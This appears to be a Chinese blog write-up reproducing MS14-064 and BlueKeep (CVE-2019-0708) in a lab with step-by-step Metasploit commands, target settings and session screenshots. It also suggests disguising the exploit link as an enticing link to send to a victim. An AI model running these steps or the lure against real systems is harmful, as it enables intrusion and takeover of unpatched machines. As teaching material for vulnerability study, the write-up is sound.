## 前言

本次漏洞复现包括 MS14-064(OLE 远程代码执行)漏洞和CVE-2019-0708（rdp远程代码执行）漏洞，如有不足之处还请多多指教。

## MS14-064漏洞复现

### 漏洞范围：

Win95+IE3 – Win10+IE11 全版本

### 漏洞成因及危害：

OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者可以利用此漏洞通过构造的网站执行任意代码。

### 漏洞复现：

在kali中启动msf：

root@kali:~# msfconsole

查找ms14-064漏洞模块：

msf6 > search ms14-064

![1611889593_60137bb91d9ff619ceda8.png!small?1611889593127](https://image.3001.net/images/20210129/1611889593_60137bb91d9ff619ceda8.png!small?1611889593127)

调用漏洞模块：

msf6 > use exploit/windows/browser/ms14_064_ole_code_execution

查看选项：

msf6 exploit(windows/browser/ms14_064_ole_code_execution) > show options

![1611889819_60137c9b9142f07982a9a.png!small?1611889819705](https://image.3001.net/images/20210129/1611889819_60137c9b9142f07982a9a.png!small?1611889819705)

设置允许调用 powershell：

msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set
allowpowershellprompt true

设置本机IP：

msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set srvhost
192.168.3.22

![1611890044_60137d7c69175e42ba5c1.png!small?1611890044540](https://image.3001.net/images/20210129/1611890044_60137d7c69175e42ba5c1.png!small?1611890044540)

因为我此时使用的是默认payload，就无需调用设置payload了，如果payload不匹配还需要重新设置payload

因为默认的Exploit target是windows xp，而我的目标机器是win7，所以还需要设置target为win7

![1611890196_60137e14c0ed50b2ce52a.png!small?1611890197063](https://image.3001.net/images/20210129/1611890196_60137e14c0ed50b2ce52a.png!small?1611890197063)

![1611890236_60137e3c9e23e2f24d93d.png!small?1611890237143](https://image.3001.net/images/20210129/1611890236_60137e3c9e23e2f24d93d.png!small?1611890237143)

全部设置完成后开始攻击：

msf6 exploit(windows/browser/ms14_064_ole_code_execution) > run（或exploit）

![1611890283_60137e6b39d39bc7cbdc3.png!small?1611890283443](https://image.3001.net/images/20210129/1611890283_60137e6b39d39bc7cbdc3.png!small?1611890283443)

可以把以上生成的链接伪装成受害者感兴趣的链接，发给目标电脑，他只要点开，我们就获得了他的管理员权限，由于此时是实验就将链接放入win7的ie浏览器中执行：

![1611890693_601380059f4dbaafe0851.png!small?1611890693735](https://image.3001.net/images/20210129/1611890693_601380059f4dbaafe0851.png!small?1611890693735)

![1611890712_601380185fd22dd611fad.png!small?1611890712412](https://image.3001.net/images/20210129/1611890712_601380185fd22dd611fad.png!small?1611890712412)

然后进入session并可以执行任意命令：

![1611890809_60138079120b0809b1748.png!small?1611890809243](https://image.3001.net/images/20210129/1611890809_60138079120b0809b1748.png!small?1611890809243)

可以通过help查看meterpreter的详细命令

## CVE-2019-0708 漏洞复现

### 漏洞范围：

windows xp 、win7、windows2003、windows2008、windows2008 R2

### 漏洞成因及危害：

2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。

此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。

### 漏洞复现：

在msf中查找cve-2019-0708漏洞模块：

msf6 > search cve:cve-2019-0708

![1611892534_60138736d4f96fc9ea668.png!small?1611892534908](https://image.3001.net/images/20210129/1611892534_60138736d4f96fc9ea668.png!small?1611892534908)

调用漏洞模块：

msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

查看选项并设置：

msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options

msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts
192.168.3.28（目标机ip）

![1611892726_601387f6d9a2810fe4102.png!small?1611892726935](https://image.3001.net/images/20210129/1611892726_601387f6d9a2810fe4102.png!small?1611892726935)

![1611892900_601388a41e8aad7359363.png!small?1611892900220](https://image.3001.net/images/20210129/1611892900_601388a41e8aad7359363.png!small?1611892900220)

注意目标机器需要开启允许远程访问：

![1611893019_6013891be76219652d650.png!small](https://image.3001.net/images/20210129/1611893019_6013891be76219652d650.png!small)

选择目标类型：

![1611893104_60138970117e0411ee8b9.png!small?1611893104233](https://image.3001.net/images/20210129/1611893104_60138970117e0411ee8b9.png!small?1611893104233)

开始攻击：

msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

![1611894156_60138d8c2750608af19b7.png!small?1611894156208](https://image.3001.net/images/20210129/1611894156_60138d8c2750608af19b7.png!small?1611894156208)

使目标机蓝屏：

![1611893176_601389b86d579dd678c65.png!small?1611893176463](https://image.3001.net/images/20210129/1611893176_601389b86d579dd678c65.png!small?1611893176463)

经过多次测试发现，也可以建立连接，如图所示：

![1611893947_60138cbba3c6358d85994.png!small](https://image.3001.net/images/20210129/1611893947_60138cbba3c6358d85994.png!small)

